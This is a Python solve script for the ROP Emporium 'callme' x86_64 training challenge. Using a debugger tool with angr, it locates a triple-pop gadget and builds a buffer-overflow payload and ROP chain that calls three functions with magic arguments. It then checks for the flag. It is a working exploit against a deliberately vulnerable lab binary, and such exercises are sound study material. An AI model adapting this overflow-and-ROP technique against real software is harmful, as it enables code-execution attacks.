"""ROP Emporium callme on x86_64: csu-style argument control through mydbg.

Each callme_* function compares all three arguments against fixed magic
values, and the binary provides `pop rdi; pop rsi; pop rdx; ret` — so the
chain is three argument-set-and-call blocks. angrop's func_call could not
build this one (its reg-setter bails on the gadget mix), so the chain is
assembled from angrop's gadget database by hand — the normal reverser
workflow when the automatic builder gives up.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_callme_x64.py
"""

from __future__ import annotations

import struct

from mydbg import rop, symbolic

import emporium

PAD = 40  # 32-byte buffer + saved rbp
MAGIC = (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    emporium.require_sysroots(("x64",))
    binary = emporium.challenge_path("x64", "callme")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001
    plt = project.loader.main_object.plt
    targets = [plt["callme_one"], plt["callme_two"], plt["callme_three"]]

    engine = rop.RopEngine(binary)
    engine.find_gadgets()
    triple = engine.find_gadgets_matching("pop rdi ; pop rsi ; pop rdx ; ret",
                                          exact=True)
    if not triple:
        raise RuntimeError("the triple-pop gadget was not found")
    gadget = triple[0]
    print(f"[+] gadget: {engine.gadget_summary(gadget)}")

    chain = b""
    for target in targets:
        chain += (struct.pack("<Q", gadget.addr) +
                  struct.pack("<Q", MAGIC[0]) +
                  struct.pack("<Q", MAGIC[1]) +
                  struct.pack("<Q", MAGIC[2]) +
                  struct.pack("<Q", target))
    payload = b"A" * PAD + chain
    print(f"[+] chain payload: {len(payload)} bytes")

    process = emporium.qemu_connect(dbg, "x64", binary, payload=payload)

    dbg.set_breakpoint("pwnme")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("pwnme was not reached")
    print(f"[+] stopped at pwnme ({dbg.snapshot().pc:#x})")

    after_read = emporium.after_read_address(dbg)
    dbg.set_breakpoint(f"{after_read:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("the after-read stop was missed")
    print(f"[+] stopped after the read at {after_read:#x}")

    result = dbg.continue_and_wait(timeout=30)
    output = emporium.drain(process, seconds=5.0)
    lines = output.decode(errors="replace").splitlines()
    printed = [line for line in lines if "ROPE{" in line]
    if not printed:
        raise RuntimeError(f"callme chain failed: {output[-200:]!r}")
    print("[+] callme-x64-solve-ok:", printed[-1])
